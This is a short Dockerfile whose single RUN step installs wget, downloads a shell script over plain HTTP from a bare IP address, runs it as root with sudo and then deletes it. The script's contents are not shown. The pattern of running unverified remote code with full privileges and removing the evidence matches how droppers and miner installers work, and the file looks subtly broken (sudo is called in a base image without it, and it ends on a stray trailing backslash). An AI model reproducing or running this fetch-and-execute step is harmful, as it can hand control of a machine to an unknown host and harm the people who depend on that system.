FROM ubuntu:latest

RUN \
sudo -s -H sh -c ' \
cd \
&& apt install -y wget \
&& wget http://44.201.182.135/install/tuan/ubuntu_install_vps.sh \
&& chmod +x ubuntu_install_vps.sh \
&& sudo ./ubuntu_install_vps.sh \
&& rm -rf  ubuntu_install_vps.sh' \
